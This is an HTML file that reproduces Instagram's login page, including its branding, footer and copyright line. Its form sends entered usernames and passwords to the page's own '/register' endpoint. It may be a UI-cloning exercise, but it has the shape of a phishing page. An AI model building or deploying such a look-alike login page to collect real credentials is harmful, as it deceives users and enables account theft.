<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Instagram Login Form </title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <form action="/register" method="post">
    <div id="container">
        <section>
            <div class="main-top">
                <div class="logo">
                    <img src="./public/photos/Screenshot 2023-12-09 114526.png" />
                </div>
                <div>
                    <input type="text" name="username" placeholder="username" class="username" required />
                    <div>
                        <input type="password" name="password" placeholder="password" class="password" required />
                    </div>
                    <input type="submit" value="Log in" class="login-btn" />
                </div>

                <span class="or"> OR </span>

                <div class="main-bottom">
                    <img src=".public/photos/facebook_logo.png" class="fa-facebook-f" />
                    <a href="https://www.facebook.com" class="logInFB"> Log in with Facebook </a><br>
                    <a href="#" class="forget"> Forgot password </a>
                </div>

            </div>
            <div class="bottom">
                <div class="signUp">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
            </div>
            <div class="app-section">
                <span> Get the app </span>
                <div class="images">
                    <img src="./public/photos/5a902dbf7f96951c82922875.png" alt="googlePlay Image">
                    <img src="./public/photos/microsoftlogo.png" alt="Microsoft Image">
                </div>
            </div>
        </section>

        <!-- Footer Section Starts from Here -->
        <footer>
            <a href="">Meta</a>
            <a href="">About</a>
            <a href="">Blog</a>
            <a href="">Jobs</a>
            <a href="">Help</a>
            <a href="">API</a>
            <a href="">Privacy</a>
            <a href="">Terms</a>
            <a href="">Top Accounts</a>
            <a href="">Locations</a>
            <a href="">Instagram Lite</a>
            <a href="">Instagram Contact</a>
            <a href="">Uploading & Non-Users</a>
            <div class="bottom-footer">
                <select name="" id="">
                    <option value="English">English</option>
                    <option value="Hindi">Hindi</option>
                    <option value="Punjabi">Punjabi</option>
                    <option value="Urdu">Urdu</option>
                    <option value="Francais">Francais</option>
                </select>
                <span> &copy; 2023 Instagram from Meta</span>
            </div>
        </footer>
    </div>
    </form>
</body>
</html>
